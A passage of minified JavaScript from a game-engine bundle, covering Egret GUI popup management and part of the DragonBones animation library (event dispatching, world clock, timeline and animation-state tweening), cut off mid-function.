			a.prototype.raw_removeElement = function (a) {
				return c.prototype.removeElementAt.call(this,
					c.prototype.getElementIndex.call(this, a))
			};
			a.prototype.raw_removeElementAt = function (a) {
				return c.prototype.removeElementAt.call(this, a)
			};
			a.prototype.raw_removeAllElements = function () {
				for (; 0 < this.numElements; )
					c.prototype.removeElementAt.call(this, 0)
			};
			a.prototype.raw_getElementIndex = function (a) {
				return c.prototype.getElementIndex.call(this, a)
			};
			a.prototype.raw_setElementIndex = function (a, d) {
				c.prototype.setElementIndex.call(this, a, d)
			};
			a.prototype.raw_swapElements = function (a, d) {
				c.prototype.swapElementsAt.call(this,
					c.prototype.getElementIndex.call(this, a), c.prototype.getElementIndex.call(this, d))
			};
			a.prototype.raw_swapElementsAt = function (a, d) {
				c.prototype.swapElementsAt.call(this, a, d)
			};
			return a
		}
		(e.Group);
		e.UIStage = f;
		f.prototype.__class__ = "egret.gui.UIStage"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (a) {
			function b() {
				a.call(this);
				this._popUpList = [];
				this.popUpDataList = [];
				this._modalColor = 0;
				this._modalAlpha = 0.5;
				this.invalidateModalFlag = !1
			}
			__extends(b, a);
			Object.defineProperty(b.prototype, "popUpList", {
				get : function () {
					return this._popUpList.concat()
				},
				enumerable : !0,
				configurable : !0
			});
			b.prototype.findPopUpData = function (a) {
				for (var b = this.popUpDataList, c = b.length, d = 0; d < c; d++) {
					var e = b[d];
					if (e.popUp == a)
						return e
				}
				return null
			};
			b.prototype.addPopUp = function (a, d, f) {
				"undefined" ===
				typeof d && (d = !1);
				"undefined" === typeof f && (f = !0);
				var h = e.UIGlobals.uiStage,
				g = this.findPopUpData(a);
				g ? (g.modal = d, a.removeEventListener(b.REMOVE_FROM_UISTAGE, this.onRemoved, this)) : (g = new c(a, d), this.popUpDataList.push(g), this._popUpList.push(a));
				h.popUpContainer.addElement(a);
				f && this.centerPopUp(a);
				"isPopUp" in a && (a.isPopUp = !0);
				d && this.invalidateModal();
				a.addEventListener(b.REMOVE_FROM_UISTAGE, this.onRemoved, this)
			};
			b.prototype.onRemoved = function (a) {
				for (var c = 0, d = this.popUpDataList, e = d.length, f = 0; f < e; f++) {
					var l =
						d[f];
					if (l.popUp == a.target) {
						"isPopUp" in l.popUp && (l.popUp.isPopUp = !1);
						l.popUp.removeEventListener(b.REMOVE_FROM_UISTAGE, this.onRemoved, this);
						this.popUpDataList.splice(c, 1);
						this._popUpList.splice(c, 1);
						this.invalidateModal();
						break
					}
					c++
				}
			};
			Object.defineProperty(b.prototype, "modalColor", {
				get : function () {
					return this._modalColor
				},
				set : function (a) {
					this._modalColor != a && (this._modalColor = a, this.invalidateModal())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(b.prototype, "modalAlpha", {
				get : function () {
					return this._modalAlpha
				},
				set : function (a) {
					this._modalAlpha != a && (this._modalAlpha = a, this.invalidateModal())
				},
				enumerable : !0,
				configurable : !0
			});
			b.prototype.invalidateModal = function () {
				this.invalidateModalFlag || (this.invalidateModalFlag = !0, e.UIGlobals.stage.addEventListener(d.Event.ENTER_FRAME, this.validateModal, this), e.UIGlobals.stage.addEventListener(d.Event.RENDER, this.validateModal, this), e.UIGlobals.stage.invalidate())
			};
			b.prototype.validateModal = function (a) {
				this.invalidateModalFlag = !1;
				e.UIGlobals.stage.removeEventListener(d.Event.ENTER_FRAME,
					this.validateModal, this);
				e.UIGlobals.stage.removeEventListener(d.Event.RENDER, this.validateModal, this);
				this.updateModal(e.UIGlobals.uiStage)
			};
			b.prototype.updateModal = function (a) {
				for (var b = a.popUpContainer, c = !1, d = b.numElements - 1; 0 <= d; d--) {
					var f = b.getElementAt(d);
					if ((f = this.findPopUpData(f)) && f.modal) {
						c = !0;
						break
					}
				}
				c ? (this.modalMask || (this.modalMask = new e.Rect, this.modalMask.touchEnabled = !0, this.modalMask.top = this.modalMask.left = this.modalMask.right = this.modalMask.bottom = 0), this.modalMask.fillColor = this._modalColor,
					this.modalMask.alpha = this._modalAlpha, this.modalMask.parent == a ? (b.getElementIndex(this.modalMask) < d && d--, b.setElementIndex(this.modalMask, d)) : b.addElementAt(this.modalMask, d)) : this.modalMask && this.modalMask.parent == a && b.removeElement(this.modalMask)
			};
			b.prototype.removePopUp = function (a) {
				a && a.parent && this.findPopUpData(a) && ("removeElement" in a.parent ? a.parent.removeElement(a) : a.parent instanceof e.UIComponent ? a.parent._removeFromDisplayList(a) : a instanceof d.DisplayObject && a.parent.removeChild(a))
			};
			b.prototype.centerPopUp = function (a) {
				a.top = a.bottom = a.left = a.right = NaN;
				a.verticalCenter = a.horizontalCenter = 0;
				var b = a.parent;
				b && ("validateNow" in a && a.validateNow(), a.x = 0.5 * (b.width - a.layoutBoundsWidth), a.y = 0.5 * (b.height - a.layoutBoundsHeight))
			};
			b.prototype.bringToFront = function (a) {
				if (this.findPopUpData(a) && a.parent && "popUpContainer" in a.parent) {
					var b = a.parent;
					b.popUpContainer.setElementIndex(a, b.popUpContainer.numElements - 1);
					this.invalidateModal()
				}
			};
			b.REMOVE_FROM_UISTAGE = "removeFromUIStage";
			return b
		}
		(d.EventDispatcher);
		e.PopUpManagerImpl = f;
		f.prototype.__class__ = "egret.gui.PopUpManagerImpl";
		var c = function () {
			return function (a, b) {
				this.popUp = a;
				this.modal = b
			}
		}
		();
		c.prototype.__class__ = "PopUpData"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
(function (d) {
	(function (e) {
		var f = function () {
			function c() {}

			c.getImpl = function () {
				if (!c._impl)
					try {
						c._impl = d.Injector.getInstance("egret.gui.IPopUpManager")
					} catch (a) {
						c._impl = new e.PopUpManagerImpl
					}
				return c._impl
			};
			Object.defineProperty(c.prototype, "modalColor", {
				get : function () {
					return c.getImpl().modalColor
				},
				set : function (a) {
					c.getImpl().modalColor = a
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(c.prototype, "modalAlpha", {
				get : function () {
					return c.getImpl().modalAlpha
				},
				set : function (a) {
					c.getImpl().modalAlpha =
						a
				},
				enumerable : !0,
				configurable : !0
			});
			c.addPopUp = function (a, b, d) {
				"undefined" === typeof b && (b = !1);
				"undefined" === typeof d && (d = !0);
				c.getImpl().addPopUp(a, b, d);
				e.PopUpEvent.dispatchPopUpEvent(c.getImpl(), e.PopUpEvent.ADD_POPUP, a, b)
			};
			c.removePopUp = function (a) {
				c.getImpl().removePopUp(a);
				e.PopUpEvent.dispatchPopUpEvent(c.getImpl(), e.PopUpEvent.REMOVE_POPUP, a)
			};
			c.centerPopUp = function (a) {
				c.getImpl().centerPopUp(a)
			};
			c.bringToFront = function (a) {
				c.getImpl().bringToFront(a);
				e.PopUpEvent.dispatchPopUpEvent(c.getImpl(),
					e.PopUpEvent.BRING_TO_FRONT, a)
			};
			Object.defineProperty(c, "popUpList", {
				get : function () {
					return c.getImpl().popUpList
				},
				enumerable : !0,
				configurable : !0
			});
			c.addEventListener = function (a, b, d, e, f) {
				"undefined" === typeof e && (e = !1);
				"undefined" === typeof f && (f = 0);
				c.getImpl().addEventListener(a, b, this, e, f)
			};
			c.removeEventListener = function (a, b, d, e) {
				"undefined" === typeof e && (e = !1);
				c.getImpl().removeEventListener(a, b, d, e)
			};
			return c
		}
		();
		e.PopUpManager = f;
		f.prototype.__class__ = "egret.gui.PopUpManager"
	})(d.gui || (d.gui = {}))
})(egret ||
	(egret = {}));
var __extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
}, dragonBones;
(function (d) {
	(function (a) {
		var b = function () {
			function a(b, c) {
				"undefined" === typeof b && (b = 0);
				"undefined" === typeof c && (c = 0);
				this.x = b;
				this.y = c
			}
			a.prototype.toString = function () {
				return "[Point (x=" + this.x + " y=" + this.y + ")]"
			};
			return a
		}
		();
		a.Point = b;
		b.prototype.__class__ = "dragonBones.geom.Point";
		b = function () {
			return function (a, b, c, d) {
				"undefined" === typeof a && (a = 0);
				"undefined" === typeof b && (b = 0);
				"undefined" === typeof c && (c = 0);
				"undefined" === typeof d && (d = 0);
				this.x = a;
				this.y = b;
				this.width = c;
				this.height = d
			}
		}
		();
		a.Rectangle =
			b;
		b.prototype.__class__ = "dragonBones.geom.Rectangle";
		b = function () {
			function a() {
				this.a = 1;
				this.c = this.b = 0;
				this.d = 1;
				this.ty = this.tx = 0
			}
			a.prototype.invert = function () {
				var a = this.a,
				b = this.b,
				c = this.c,
				d = this.d,
				e = this.tx,
				f = a * d - b * c;
				this.a = d / f;
				this.b = -b / f;
				this.c = -c / f;
				this.d = a / f;
				this.tx = (c * this.ty - d * e) / f;
				this.ty =  - (a * this.ty - b * e) / f
			};
			return a
		}
		();
		a.Matrix = b;
		b.prototype.__class__ = "dragonBones.geom.Matrix";
		b = function () {
			return function () {
				this.redOffset = this.redMultiplier = this.greenOffset = this.greenMultiplier = this.blueOffset =
					this.blueMultiplier = this.alphaOffset = this.alphaMultiplier = 0
			}
		}
		();
		a.ColorTransform = b;
		b.prototype.__class__ = "dragonBones.geom.ColorTransform"
	})(d.geom || (d.geom = {}));
	var e = d.geom;
	(function (a) {
		var b = function () {
			return function (a) {
				this.type = a
			}
		}
		();
		a.Event = b;
		b.prototype.__class__ = "dragonBones.events.Event";
		var c = function (a) {
			function b(c) {
				a.call(this, c)
			}
			__extends(b, a);
			b.FADE_IN = "fadeIn";
			b.FADE_OUT = "fadeOut";
			b.START = "start";
			b.COMPLETE = "complete";
			b.LOOP_COMPLETE = "loopComplete";
			b.FADE_IN_COMPLETE = "fadeInComplete";
			b.FADE_OUT_COMPLETE = "fadeOutComplete";
			return b
		}
		(b);
		a.AnimationEvent = c;
		c.prototype.__class__ = "dragonBones.events.AnimationEvent";
		c = function (a) {
			function b(c) {
				a.call(this, c)
			}
			__extends(b, a);
			b.Z_ORDER_UPDATED = "zOrderUpdated";
			return b
		}
		(b);
		a.ArmatureEvent = c;
		c.prototype.__class__ = "dragonBones.events.ArmatureEvent";
		c = function (a) {
			function b(c) {
				a.call(this, c)
			}
			__extends(b, a);
			b.ANIMATION_FRAME_EVENT = "animationFrameEvent";
			b.BONE_FRAME_EVENT = "boneFrameEvent";
			return b
		}
		(b);
		a.FrameEvent = c;
		c.prototype.__class__ = "dragonBones.events.FrameEvent";
		b = function (a) {
			function b(c) {
				a.call(this, c)
			}
			__extends(b, a);
			b.SOUND = "sound";
			b.BONE_FRAME_EVENT = "boneFrameEvent";
			return b
		}
		(b);
		a.SoundEvent = b;
		b.prototype.__class__ = "dragonBones.events.SoundEvent";
		b = function () {
			function a() {}

			a.prototype.hasEventListener = function (a) {
				return this._listenersMap && this._listenersMap[a] ? !0 : !1
			};
			a.prototype.addEventListener = function (a, b) {
				if (a && b) {
					this._listenersMap || (this._listenersMap = {});
					var c = this._listenersMap[a];
					c && this.removeEventListener(a, b);
					c ? c.push(b) : this._listenersMap[a] =
						[b]
				}
			};
			a.prototype.removeEventListener = function (a, b) {
				if (this._listenersMap && a && b) {
					var c = this._listenersMap[a];
					if (c)
						for (var d = c.length, e = 0; e < d; e++)
							c[e] == b && (1 == d ? (c.length = 0, delete this._listenersMap[a]) : c.splice(e, 1))
				}
			};
			a.prototype.removeAllEventListeners = function (a) {
				a ? delete this._listenersMap[a] : this._listenersMap = null
			};
			a.prototype.dispatchEvent = function (a) {
				if (a) {
					var b = this._listenersMap[a.type];
					if (b) {
						a.target = this;
						for (var c = b.concat(), b = b.length, d = 0; d < b; d++)
							c[d](a)
					}
				}
			};
			return a
		}
		();
		a.EventDispatcher =
			b;
		b.prototype.__class__ = "dragonBones.events.EventDispatcher";
		b = function (a) {
			function b() {
				a.call(this);
				if (b._instance)
					throw Error("Singleton already constructed!");
			}
			__extends(b, a);
			b.getInstance = function () {
				b._instance || (b._instance = new b);
				return b._instance
			};
			return b
		}
		(b);
		a.SoundEventManager = b;
		b.prototype.__class__ = "dragonBones.events.SoundEventManager"
	})(d.events || (d.events = {}));
	var f = d.events;
	(function (c) {
		var d = function () {
			function a() {
				this.timeScale = 1;
				this.time = 0.001 * (new Date).getTime();
				this._animatableList =
					[]
			}
			a.prototype.contains = function (a) {
				return 0 <= this._animatableList.indexOf(a)
			};
			a.prototype.add = function (a) {
				a && -1 == this._animatableList.indexOf(a) && this._animatableList.push(a)
			};
			a.prototype.remove = function (a) {
				a = this._animatableList.indexOf(a);
				0 <= a && (this._animatableList[a] = null)
			};
			a.prototype.clear = function () {
				this._animatableList.length = 0
			};
			a.prototype.advanceTime = function (a) {
				if (0 > a) {
					var b = 0.001 * (new Date).getTime();
					a = b - this.time;
					this.time = b
				}
				a *= this.timeScale;
				b = this._animatableList.length;
				if (0 != b) {
					for (var c =
							0, d = 0; d < b; d++) {
						var e = this._animatableList[d];
						e && (c != d && (this._animatableList[c] = e, this._animatableList[d] = null), e.advanceTime(a), c++)
					}
					if (c != d) {
						for (b = this._animatableList.length; d < b; )
							this._animatableList[c++] = this._animatableList[d++];
						this._animatableList.length = c
					}
				}
			};
			a.clock = new a;
			return a
		}
		();
		c.WorldClock = d;
		d.prototype.__class__ = "dragonBones.animation.WorldClock";
		var k = function () {
			function c() {
				this.transform = new a.DBTransform;
				this.pivot = new e.Point;
				this._durationTransform = new a.DBTransform;
				this._durationPivot =
					new e.Point;
				this._durationColor = new e.ColorTransform
			}
			c._borrowObject = function () {
				return 0 == c._pool.length ? new c : c._pool.pop()
			};
			c._returnObject = function (a) {
				0 > c._pool.indexOf(a) && (c._pool[c._pool.length] = a);
				a.clear()
			};
			c._clear = function () {
				for (var a = c._pool.length; a--; )
					c._pool[a].clear();
				c._pool.length = 0
			};
			c.getEaseValue = function (a, b) {
				if (1 < b) {
					var d = 0.5 * (1 - Math.cos(a * Math.PI)) - a;
					b -= 1
				} else
					0 < b ? d = Math.sin(a * c.HALF_PI) - a : 0 > b && (d = 1 - Math.cos(a * c.HALF_PI) - a, b *= -1);
				return d * b + a
			};
			c.prototype.fadeIn = function (a, b,
				c) {
				this._bone = a;
				this._animationState = b;
				this._timeline = c;
				this._originTransform = this._timeline.originTransform;
				this._originPivot = this._timeline.originPivot;
				this._tweenColor = this._tweenTransform = !1;
				this._totalTime = this._animationState.totalTime;
				this.transform.x = 0;
				this.transform.y = 0;
				this.transform.scaleX = 0;
				this.transform.scaleY = 0;
				this.transform.skewX = 0;
				this.transform.skewY = 0;
				this.pivot.x = 0;
				this.pivot.y = 0;
				this._durationTransform.x = 0;
				this._durationTransform.y = 0;
				this._durationTransform.scaleX = 0;
				this._durationTransform.scaleY =
					0;
				this._durationTransform.skewX = 0;
				this._durationTransform.skewY = 0;
				this._durationPivot.x = 0;
				this._durationPivot.y = 0;
				this._currentFrame = null;
				switch (this._timeline.getFrameList().length) {
				case 0:
					this._bone._arriveAtFrame(null, this, this._animationState, !1);
					this._updateState = 0;
					break;
				case 1:
					this._updateState = -1;
					break;
				default:
					this._updateState = 1
				}
			};
			c.prototype.fadeOut = function () {
				this.transform.skewX = b.TransformUtil.formatRadian(this.transform.skewX);
				this.transform.skewY = b.TransformUtil.formatRadian(this.transform.skewY)
			};
			c.prototype.update = function (a) {
				if (this._updateState)
					if (0 < this._updateState) {
						a = 0 == this._timeline.scale ? 1 : a / this._timeline.scale;
						1 == a && (a = 0.99999999);
						a += this._timeline.offset;
						var d = Math.floor(a);
						a -= d;
						for (var e = this._totalTime * a, f = !1, k; !this._currentFrame || e > this._currentFramePosition + this._currentFrameDuration || e < this._currentFramePosition; )
							f && this._bone._arriveAtFrame(this._currentFrame, this, this._animationState, !0), f = !0, this._currentFrame ? (k = this._timeline.getFrameList().indexOf(this._currentFrame) +
									1, k >= this._timeline.getFrameList().length && (k = 0), this._currentFrame = this._timeline.getFrameList()[k]) : (k = 0, this._currentFrame = this._timeline.getFrameList()[0]), this._currentFrameDuration = this._currentFrame.duration, this._currentFramePosition = this._currentFrame.position;
						f && (this.tweenActive = 0 <= this._currentFrame.displayIndex, k++, k >= this._timeline.getFrameList().length && (k = 0), f = this._timeline.getFrameList()[k], 0 == k && this._animationState.loop && this._animationState.loopCount >= Math.abs(this._animationState.loop) -
							1 && 0.99999999 < ((this._currentFramePosition + this._currentFrameDuration) / this._totalTime + d - this._timeline.offset) * this._timeline.scale ? (this._updateState = 0, this._tweenEasing = NaN) : 0 > this._currentFrame.displayIndex || 0 > f.displayIndex || !this._animationState.tweenEnabled ? this._tweenEasing = NaN : isNaN(this._animationState.clip.tweenEasing) ? this._tweenEasing = this._currentFrame.tweenEasing : this._tweenEasing = this._animationState.clip.tweenEasing, isNaN(this._tweenEasing) ? this._tweenColor = this._tweenTransform = !1 :
								(this._durationTransform.x = f.transform.x - this._currentFrame.transform.x, this._durationTransform.y = f.transform.y - this._currentFrame.transform.y, this._durationTransform.skewX = f.transform.skewX - this._currentFrame.transform.skewX, this._durationTransform.skewY = f.transform.skewY - this._currentFrame.transform.skewY, this._durationTransform.scaleX = f.transform.scaleX - this._currentFrame.transform.scaleX, this._durationTransform.scaleY = f.transform.scaleY - this._currentFrame.transform.scaleY, 0 == k && (this._durationTransform.skewX =
											b.TransformUtil.formatRadian(this._durationTransform.skewX), this._durationTransform.skewY = b.TransformUtil.formatRadian(this._durationTransform.skewY)), this._durationPivot.x = f.pivot.x - this._currentFrame.pivot.x, this._durationPivot.y = f.pivot.y - this._currentFrame.pivot.y, this._tweenTransform = 0 != this._durationTransform.x || 0 != this._durationTransform.y || 0 != this._durationTransform.skewX || 0 != this._durationTransform.skewY || 0 != this._durationTransform.scaleX || 0 != this._durationTransform.scaleY || 0 != this._durationPivot.x ||
										0 != this._durationPivot.y ? !0 : !1, this._currentFrame.color && f.color ? (this._durationColor.alphaOffset = f.color.alphaOffset - this._currentFrame.color.alphaOffset, this._durationColor.redOffset = f.color.redOffset - this._currentFrame.color.redOffset, this._durationColor.greenOffset = f.color.greenOffset - this._currentFrame.color.greenOffset, this._durationColor.blueOffset = f.color.blueOffset - this._currentFrame.color.blueOffset, this._durationColor.alphaMultiplier = f.color.alphaMultiplier - this._currentFrame.color.alphaMultiplier,
										this._durationColor.redMultiplier = f.color.redMultiplier - this._currentFrame.color.redMultiplier, this._durationColor.greenMultiplier = f.color.greenMultiplier - this._currentFrame.color.greenMultiplier, this._durationColor.blueMultiplier = f.color.blueMultiplier - this._currentFrame.color.blueMultiplier, this._tweenColor = 0 != this._durationColor.alphaOffset || 0 != this._durationColor.redOffset || 0 != this._durationColor.greenOffset || 0 != this._durationColor.blueOffset || 0 != this._durationColor.alphaMultiplier || 0 != this._durationColor.redMultiplier ||
											0 != this._durationColor.greenMultiplier || 0 != this._durationColor.blueMultiplier ? !0 : !1) : this._currentFrame.color ? (this._tweenColor = !0, this._durationColor.alphaOffset = -this._currentFrame.color.alphaOffset, this._durationColor.redOffset = -this._currentFrame.color.redOffset, this._durationColor.greenOffset = -this._currentFrame.color.greenOffset, this._durationColor.blueOffset = -this._currentFrame.color.blueOffset, this._durationColor.alphaMultiplier = 1 - this._currentFrame.color.alphaMultiplier, this._durationColor.redMultiplier =
											1 - this._currentFrame.color.redMultiplier, this._durationColor.greenMultiplier = 1 - this._currentFrame.color.greenMultiplier, this._durationColor.blueMultiplier = 1 - this._currentFrame.color.blueMultiplier) : f.color ? (this._tweenColor = !0, this._durationColor.alphaOffset = f.color.alphaOffset, this._durationColor.redOffset = f.color.redOffset, this._durationColor.greenOffset = f.color.greenOffset, this._durationColor.blueOffset = f.color.blueOffset, this._durationColor.alphaMultiplier = f.color.alphaMultiplier - 1, this._durationColor.redMultiplier =
											f.color.redMultiplier - 1, this._durationColor.greenMultiplier = f.color.greenMultiplier - 1, this._durationColor.blueMultiplier = f.color.blueMultiplier - 1) : this._tweenColor = !1), this._tweenTransform || (this._animationState.blend ? (this.transform.x = this._originTransform.x + this._currentFrame.transform.x, this.transform.y = this._originTransform.y + this._currentFrame.transform.y, this.transform.skewX = this._originTransform.skewX + this._currentFrame.transform.skewX, this.transform.skewY = this._originTransform.skewY + this._currentFrame.transform.skewY,
									this.transform.scaleX = this._originTransform.scaleX + this._currentFrame.transform.scaleX, this.transform.scaleY = this._originTransform.scaleY + this._currentFrame.transform.scaleY, this.pivot.x = this._originPivot.x + this._currentFrame.pivot.x, this.pivot.y = this._originPivot.y + this._currentFrame.pivot.y) : (this.transform.x = this._currentFrame.transform.x, this.transform.y = this._currentFrame.transform.y, this.transform.skewX = this._currentFrame.transform.skewX, this.transform.skewY = this._currentFrame.transform.skewY,
									this.transform.scaleX = this._currentFrame.transform.scaleX, this.transform.scaleY = this._currentFrame.transform.scaleY, this.pivot.x = this._currentFrame.pivot.x, this.pivot.y = this._currentFrame.pivot.y)), this._tweenColor || (this._currentFrame.color ? this._bone._updateColor(this._currentFrame.color.alphaOffset, this._currentFrame.color.redOffset, this._currentFrame.color.greenOffset, this._currentFrame.color.blueOffset, this._currentFrame.color.alphaMultiplier, this._currentFrame.color.redMultiplier, this._currentFrame.color.greenMultiplier,
									this._currentFrame.color.blueMultiplier, !0) : this._bone._isColorChanged && this._bone._updateColor(0, 0, 0, 0, 1, 1, 1, 1, !1)), this._bone._arriveAtFrame(this._currentFrame, this, this._animationState, !1));
						if (this._tweenTransform || this._tweenColor)
							a = (e - this._currentFramePosition) / this._currentFrameDuration, this._tweenEasing && (a = c.getEaseValue(a, this._tweenEasing));
						this._tweenTransform && (d = this._currentFrame.transform, e = this._currentFrame.pivot, this._animationState.blend ? (this.transform.x = this._originTransform.x +
									d.x + this._durationTransform.x * a, this.transform.y = this._originTransform.y + d.y + this._durationTransform.y * a, this.transform.skewX = this._originTransform.skewX + d.skewX + this._durationTransform.skewX * a, this.transform.skewY = this._originTransform.skewY + d.skewY + this._durationTransform.skewY * a, this.transform.scaleX = this._originTransform.scaleX + d.scaleX + this._durationTransform.scaleX * a, this.transform.scaleY = this._originTransform.scaleY + d.scaleY + this._durationTransform.scaleY * a, this.pivot.x = this._originPivot.x +
									e.x + this._durationPivot.x * a, this.pivot.y = this._originPivot.y + e.y + this._durationPivot.y * a) : (this.transform.x = d.x + this._durationTransform.x * a, this.transform.y = d.y + this._durationTransform.y * a, this.transform.skewX = d.skewX + this._durationTransform.skewX * a, this.transform.skewY = d.skewY + this._durationTransform.skewY * a, this.transform.scaleX = d.scaleX + this._durationTransform.scaleX * a, this.transform.scaleY = d.scaleY + this._durationTransform.scaleY * a, this.pivot.x = e.x + this._durationPivot.x * a, this.pivot.y = e.y + this._durationPivot.y *
									a));
						this._tweenColor && (this._currentFrame.color ? this._bone._updateColor(this._currentFrame.color.alphaOffset + this._durationColor.alphaOffset * a, this._currentFrame.color.redOffset + this._durationColor.redOffset * a, this._currentFrame.color.greenOffset + this._durationColor.greenOffset * a, this._currentFrame.color.blueOffset + this._durationColor.blueOffset * a, this._currentFrame.color.alphaMultiplier + this._durationColor.alphaMultiplier * a, this._currentFrame.color.redMultiplier + this._durationColor.redMultiplier *
								a, this._currentFrame.color.greenMultiplier + this._durationColor.greenMultiplier * a, this._currentFrame.color.blueMultiplier + this._durationColor.blueMultiplier * a, !0) : this._bone._updateColor(this._durationColor.alphaOffset * a, this._durationColor.redOffset * a, this._durationColor.greenOffset * a, this._durationColor.blueOffset * a, 1 + this._durationColor.alphaMultiplier * a, 1 + this._durationColor.redMultiplier * a, 1 + this._durationColor.greenMultiplier * a, 1 + this._durationColor.blueMultiplier * a, !0))
					} else
						this._updateState =
							0, this._animationState.blend ? (this.transform.copy(this._originTransform), this.pivot.x = this._originPivot.x, this.pivot.y = this._originPivot.y) : (this.transform.x = this.transform.y = this.transform.skewX = this.transform.skewY = this.transform.scaleX = this.transform.scaleY = 0, this.pivot.x = 0, this.pivot.y = 0), this._currentFrame = this._timeline.getFrameList()[0], this.tweenActive = 0 <= this._currentFrame.displayIndex, this._currentFrame.color ? this._bone._updateColor(this._currentFrame.color.alphaOffset, this._currentFrame.color.redOffset,
							this._currentFrame.color.greenOffset, this._currentFrame.color.blueOffset, this._currentFrame.color.alphaMultiplier, this._currentFrame.color.redMultiplier, this._currentFrame.color.greenMultiplier, this._currentFrame.color.blueMultiplier, !0) : this._bone._updateColor(0, 0, 0, 0, 1, 1, 1, 1, !1), this._bone._arriveAtFrame(this._currentFrame, this, this._animationState, !1)
			};
			c.prototype.clear = function () {
				this._updateState = 0;
				this._originPivot = this._originTransform = this._currentFrame = this._timeline = this._animationState =
					this._bone = null
			};
			c.HALF_PI = 0.5 * Math.PI;
			c._pool = [];
			return c
		}
		();
		c.TimelineState = k;
		k.prototype.__class__ = "dragonBones.animation.TimelineState";
		var m = function () {
			function a() {
				this.layer = this.loop = 0;
				this._timelineStates = {}

			}
			a._borrowObject = function () {
				return 0 == a._pool.length ? new a : a._pool.pop()
			};
			a._returnObject = function (b) {
				0 > a._pool.indexOf(b) && (a._pool[a._pool.length] = b);
				b.clear()
			};
			a._clear = function () {
				for (var b = a._pool.length; b--; )
					a._pool[b].clear();
				a._pool.length = 0
			};
			a.prototype.fadeIn = function (a, b, c, d,
				e, f, k, m) {
				this.layer = f;
				this.clip = b;
				this.name = this.clip.name;
				this.totalTime = this.clip.duration;
				this._armature = a;
				2 > Math.round(this.clip.duration * this.clip.frameRate) || Infinity == d ? (this.timeScale = 1, this.currentTime = this.totalTime, this.loop = 0 <= this.loop ? 1 : -1) : (this.timeScale = d, this.currentTime = 0, this.loop = e);
				this._pauseBeforeFadeInComplete = m;
				this._fadeInTime = c * this.timeScale;
				this._fadeState = 1;
				this._fadeOutBeginTime = 0;
				this._fadeOutWeight = -1;
				this._fadeWeight = 0;
				this._fadeIn = !0;
				this._fadeOut = !1;
				this.loopCount =
					-1;
				this.displayControl = k;
				this.isPlaying = !0;
				this.isComplete = !1;
				this.weight = 1;
				this.tweenEnabled = this.enabled = this.blend = !0;
				this.updateTimelineStates()
			};
			a.prototype.fadeOut = function (a, b) {
				"undefined" === typeof b && (b = !1);
				if (this._armature && !(0 <= this._fadeOutWeight)) {
					this._fadeState = -1;
					this._fadeOutWeight = this._fadeWeight;
					this._fadeOutTime = a * this.timeScale;
					this._fadeOutBeginTime = this.currentTime;
					this._fadeOut = !0;
					this.isPlaying = !b;
					this.displayControl = !1;
					for (var c in this._timelineStates)
						this._timelineStates[c].fadeOut();
					this.enabled = !0
				}
			};
			a.prototype.play = function () {
				this.isPlaying = !0
			};
			a.prototype.stop = function () {
				this.isPlaying = !1
			};
			a.prototype.getMixingTransform = function (a) {
				return this._mixingTransforms ? Number(this._mixingTransforms[a]) : -1
			};
			a.prototype.addMixingTransform = function (a, b, c) {
				"undefined" === typeof b && (b = 2);
				"undefined" === typeof c && (c = !0);
				if (this.clip && this.clip.getTimeline(a)) {
					this._mixingTransforms || (this._mixingTransforms = {});
					if (c) {
						c = this._armature._boneList.length;
						for (var d, e; c--; )
							d = this._armature._boneList[c],
							d.name == a && (e = d), e && (e == d || e.contains(d)) && (this._mixingTransforms[d.name] = b)
					} else
						this._mixingTransforms[a] = b;
					this.updateTimelineStates()
				} else
					throw Error();
			};
			a.prototype.removeMixingTransform = function (a, b) {
				"undefined" === typeof a && (a = null);
				"undefined" === typeof b && (b = !0);
				if (a) {
					if (b)
						for (var c = this._armature._boneList.length, d, e; c--; )
							d = this._armature._boneList[c], d.name == a && (e = d), e && (e == d || e.contains(d)) && delete this._mixingTransforms[d.name];
					else
						delete this._mixingTransforms[a];
					for (var f in this._mixingTransforms) {
						var k =
							!0;
						break
					}
					k || (this._mixingTransforms = null)
				} else
					this._mixingTransforms = null;
				this.updateTimelineStates()
			};
			a.prototype.advanceTime = function (a) {
				if (!this.enabled)
					return !1;
				var b,
				c;
				this._fadeIn && (this._fadeIn = !1, this._armature.hasEventListener(f.AnimationEvent.FADE_IN) && (b = new f.AnimationEvent(f.AnimationEvent.FADE_IN), b.animationState = this, this._armature._eventList.push(b)));
				this._fadeOut && (this._fadeOut = !1, this._armature.hasEventListener(f.AnimationEvent.FADE_OUT) && (b = new f.AnimationEvent(f.AnimationEvent.FADE_OUT),
						b.animationState = this, this._armature._eventList.push(b)));
				this.currentTime += a * this.timeScale;
				if (this.isPlaying && !this.isComplete) {
					var d;
					if (this._pauseBeforeFadeInComplete)
						this.isPlaying = this._pauseBeforeFadeInComplete = !1, a = 0, d = Math.floor(a);
					else if (a = this.currentTime / this.totalTime, d = Math.floor(a), d != this.loopCount && (-1 == this.loopCount && this._armature.hasEventListener(f.AnimationEvent.START) && (b = new f.AnimationEvent(f.AnimationEvent.START), b.animationState = this, this._armature._eventList.push(b)),
							this.loopCount = d))
						this.loop && this.loopCount * this.loopCount >= this.loop * this.loop - 1 ? (c = !0, a = 1, d = 0, this._armature.hasEventListener(f.AnimationEvent.COMPLETE) && (b = new f.AnimationEvent(f.AnimationEvent.COMPLETE), b.animationState = this, this._armature._eventList.push(b))) : this._armature.hasEventListener(f.AnimationEvent.LOOP_COMPLETE) && (b = new f.AnimationEvent(f.AnimationEvent.LOOP_COMPLETE), b.animationState = this, this._armature._eventList.push(b));
					for (var e in this._timelineStates)
						this._timelineStates[e].update(a);
					b = this.clip.getFrameList();
					if (0 < b.length) {
						a = this.totalTime * (a - d);
						for (d = !1; !this._currentFrame || a > this._currentFrame.position + this._currentFrame.duration || a < this._currentFrame.position; )
